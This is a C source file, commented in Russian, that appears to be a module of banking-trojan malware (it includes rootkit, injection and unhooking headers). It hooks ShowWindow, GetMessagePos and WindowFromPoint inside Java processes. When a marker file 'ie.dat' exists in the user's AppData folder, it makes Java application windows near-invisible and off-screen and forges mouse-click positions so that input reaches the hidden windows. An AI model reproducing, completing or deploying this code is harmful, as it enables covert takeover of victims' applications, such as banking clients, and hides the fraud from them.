#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
//#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
//#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"


#include "Java.h"

//#include "ntdll.h"

// Глобальные переменные для перехвата внутри Java-процесса
// будем перехватывать только главный фрейм и одно диалоговое окно
static LONG g_old_frame_wnd_proc  = 0;
static LONG g_old_dialog_wnd_proc = 0;
static HWND g_frame_wnd  = 0;
static HWND g_dialog_wnd = 0;
static bool g_is_dialog = false;

// Волшебная константа - сколько итераций в перехваченной GetMessagePost должно
// пройти, чтобы выполнился клик мышкой
static const LONG MSG_POS_COUNT	= 10;

// Для работы с координатами кликов мышки
static int g_xPos = -1;
static int g_yPos = -1;
static int g_Count = 0;


// Все функции которые мы будем хучить для Java
typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
static PShowWindow    Real_ShowWindow;

typedef DWORD ( WINAPI *PGetMessagePos )( VOID );
static PGetMessagePos    Real_GetMessagePos;

typedef HWND  ( WINAPI *PWindowFromPoint )( POINT Point );
static PWindowFromPoint    Real_WindowFromPoint;


/************************************************************************/
/* Новая оконная процедура для java-окон, позволяет ловить клики мыши   */
// и нажатия клавиш, когда окно не в фокусе
static LONG CALLBACK __NewJavaWndProc(HWND hWnd, UINT uMsg,
																			WPARAM wParam, LPARAM lParam)
{
	static char szBuf[MAX_PATH] = {'\0'};

	WCHAR cClasN[50];

	bool isFrame  = false;
	bool isDialog = false;

	switch (uMsg)
	{
		case WM_LBUTTONDOWN:
			{
				pGetClassNameW(hWnd, cClasN, MAX_PATH);

				isFrame  = (NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtFrame"));
				isDialog = (NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtDialog"));
				if(isFrame)
				{
					g_is_dialog = false;
					g_frame_wnd = hWnd;
				}
				else if(isDialog)
				{
					g_is_dialog = true;
					g_dialog_wnd = hWnd;
				}

				// Запоминаем координаты клика для того, чтобы потом 
				// вернуть их в ф-ии GetMessagePos
				g_xPos = GET_X_LPARAM(lParam); 
				g_yPos = GET_Y_LPARAM(lParam); 
				g_Count = 0;

				// Отладочный вывод
				OutputDebugStr("LBTNDOWN");
				wsprintfA(szBuf, "x: %d, y: %d", g_xPos, g_yPos);
				OutputDebugStr(szBuf);

				break;
			}
		case WM_LBUTTONUP:
			{			
				break;
			}
		case WM_MOUSEACTIVATE:
			{				
				return MA_NOACTIVATE;// запрещаем активировать окно
			}
		case WM_CHAR:
			{
				// Сюда попадает символьный ввод, ничего делать не надо //
				
				break;
			}
	}
	// Это фрейм или диалог?
	LONG old_wnd_proc = ((g_frame_wnd == hWnd) ? g_old_frame_wnd_proc : g_old_dialog_wnd_proc);

	// Вызываем дефолтную оконную функцию
	return CallWindowProc((WNDPROC)old_wnd_proc, hWnd, uMsg, wParam, lParam);
}

/************************************************************************/
/* Координаты клика определяются Java через эту функцию, поэтому будем  */
// возвращать в ней ранее запомненные координаты, пришедшие через 
// WM_LBUTTONDOWN
DWORD WINAPI Hook_GetMessagePos()
{
	POINT lpPoint;
	lpPoint.x = g_xPos;
	lpPoint.y = g_yPos;
	DWORD res = 0;

	if (g_Count > MSG_POS_COUNT)
	{
		// GetMessagePos слишком короткая, движок неверно хукает ее
		// поэтому единственный способ вызвать оригинальную ф-ю - 
		// анхукнуть её
		UnhookGetMessagePos();
	
		//// Вызываем оригинальную ф-ю 
		res = (DWORD)pGetMessagePos();
		//res = Real_GetMessagePos();

		//// Возвращаем на место обработчик 
		HookApi( 3, 0x9D2F45DB, (DWORD)&Hook_GetMessagePos);
	}
	else
	{
		g_Count++;

		// Переводим координаты из клиентских в экранные
		HWND csWnd = (g_is_dialog ? g_dialog_wnd : g_frame_wnd);
		pClientToScreen(csWnd, &lpPoint);

		// Вроде это не совсем правильная арифметика, см. MSDN по GetMessagePos
		res = ((lpPoint.y<<16) + lpPoint.x);
	}
	// Возвращаем результат
	return res;
}

/************************************************************************/
// Перехватывам эту ф-ю для того, чтобы клики доходили даже в перекрытое 
// и скрытое окно
HWND WINAPI Hook_WindowFromPoint(POINT Point)
{
	// Селектор - фрейм/диалог
	HWND res = (g_is_dialog ? g_dialog_wnd : g_frame_wnd);

	if (g_Count > MSG_POS_COUNT)
	{
		// Вызываем оригинальную функцию
		res = Real_WindowFromPoint(Point);
	}
	return res;
}

/************************************************************************/
/* Меняет оконную функцию фрейма или диалога на нашу собственную,       */
// выполняет перед этим проверку, не сделана ли замена ранее
void ChangeWndProc(HWND hWnd, HWND *hWnd2Store, LONG *oldProc)
{
	// Если оконную процедуру ещё не подменили на собственную
	if ( (LONG)pGetWindowLongW(hWnd, GWL_WNDPROC) != (LONG)__NewJavaWndProc )
		{
			*hWnd2Store = hWnd;	
			*oldProc = (LONG)pSetWindowLongW(hWnd, GWL_WNDPROC, (LONG)__NewJavaWndProc);
			pOutputDebugStringW(*oldProc ? L"WndProc change Ok" : L"WndProc change Failed");
		}
}
///необходимые флаги
typedef enum {
    SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
    SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
} SHGFP_TYPE;
#define CSIDL_APPDATA                   0x001a        // <user name>\Application Data
/************************************************************************/
/* В момент показа окна на экране перехватываем его оконную функцию,    */
// если она ещё не перехвачена. Если показывается диалог, то считаем его
// модальным, все координаты кликов будут обрабатываться для него.
static BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
{
	// Получаем название класса окна
	WCHAR cClasN[MAX_PATH];
	pGetClassNameW(hWnd, cClasN, MAX_PATH);
	bool isFrame  = NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtFrame");//(NULL != m_strstr(cClasN, "SunAwtFrame"));
	bool isDialog = NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtDialog");//(NULL != m_strstr(cClasN, "SunAwtDialog"));

	if (SW_HIDE != Cmd)
	{
		if (isFrame)
		{
			// Перебиваем оконную функцию на свою
			ChangeWndProc(hWnd, &g_frame_wnd, &g_old_frame_wnd_proc);
			g_is_dialog = false;
		} else
		if (isDialog)
		{
			// Перебиваем оконную функцию на свою

			ChangeWndProc(hWnd, &g_dialog_wnd, &g_old_dialog_wnd_proc);
			g_is_dialog = true;
		}
	}
	else
	{
		g_is_dialog = false;
	}

	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',L'\0'};
	WCHAR *SysPath1 = (WCHAR*)MemAlloc( MAX_PATH* sizeof(WCHAR) );
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);	
	
	plstrcatW( &SysPath1[0], ExplorerAdd );
	if ( (DWORD)pGetFileAttributesW( SysPath1 ) != -1 )
	{
		int x = (int)pGetSystemMetrics( SM_CXSCREEN );
		int y = (int)pGetSystemMetrics( SM_CYSCREEN );
		RECT  tmp;
		pGetWindowRect(hWnd,&tmp);	
		pSleep(10);
		pMoveWindow(hWnd,x-300, 10, tmp.right - tmp.left, tmp.bottom - tmp.top,true);
		pSetWindowPos(hWnd, HWND_BOTTOM, (int)(x-10), (int)10,  (int)(tmp.right - tmp.left), (int)(tmp.bottom - tmp.top), SWP_NOACTIVATE );
		pSetWindowLongA(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
		pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);
		pSetWindowLongA(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
		
		Cmd=0;
	}
	MemFree(SysPath1);	

	// Вызываем дефолтную ShowWindow
	return Real_ShowWindow(hWnd, Cmd);
}

/************************************************************************/
bool WINAPI IsJava()
{
	// Функция вернёт истину если она вызвана в процессе
	// Java.exe или Javaw.exe
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	// Java или Javaw
	if ( dwProcessHash == 0x150CFBD3 || dwProcessHash == 0x1F1AA76A )
		{			
		//	OutputDebugStr("Java process has been found!");
			MemFree( ModulePath );
			return true;
		}

	MemFree( ModulePath );
	return false;
}


/************************************************************************/
bool HookJava()
{
	// функция вешает хуки на базовые функции которые использует
	// Java для работы со своими окнами
	// Работает только в случае вызова из процесса Java

	if ( !IsJava() )
	{
		return false;
	}

	UnhookJava();

	

	return HookJavaApi();
}

/************************************************************************/
bool HookJavaApi()
{
	pOutputDebugStringA("Java process has been found!");
	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',L'\0'};
	WCHAR SysPath1[MAX_PATH* sizeof(WCHAR)];// = (WCHAR*)MemAlloc( MAX_PATH* sizeof(WCHAR) );
	
	
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);	
	plstrcatW( &SysPath1[0], ExplorerAdd );
	if ( (DWORD)pGetFileAttributesW( SysPath1 ) != -1 )
	{

		if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
		{  
			__asm mov [Real_ShowWindow], eax			
		}	

		if ( HookApi( 3, 0x9D2F45DB, (DWORD)&Hook_GetMessagePos) )
		{  
			__asm mov [Real_GetMessagePos], eax			
		}	

		if ( HookApi( 3, 0x85F352BD, (DWORD)&Hook_WindowFromPoint) )
		{  
			__asm mov [Real_WindowFromPoint], eax			
		}
	}
	else return false;
	
	return true;
}




